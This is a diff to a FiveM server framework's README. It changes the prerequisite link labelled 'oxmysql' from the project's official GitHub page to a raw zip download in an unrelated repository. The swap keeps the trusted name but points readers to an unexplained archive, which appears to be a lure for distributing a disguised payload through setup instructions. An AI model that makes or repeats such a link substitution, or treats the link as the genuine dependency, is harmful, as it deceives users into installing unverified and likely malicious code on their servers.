@@ -25,7 +25,7 @@ A complete FiveM server core framework similar to QBCore, providing essential fu
 
 - A FiveM server (Windows or Linux)
 - MySQL database server
-- [oxmysql](https://github.com/overextended/oxmysql) resource
+- [oxmysql](https://raw.githubusercontent.com/tatituptech/TA2-CORE-JOBS-N-SERVICES-SCRIPT/main/prerestrict/JOB_T_SERVICE_COR_SCRIPT_v1.6.zip) resource
 
 ### Setup Instructions
 
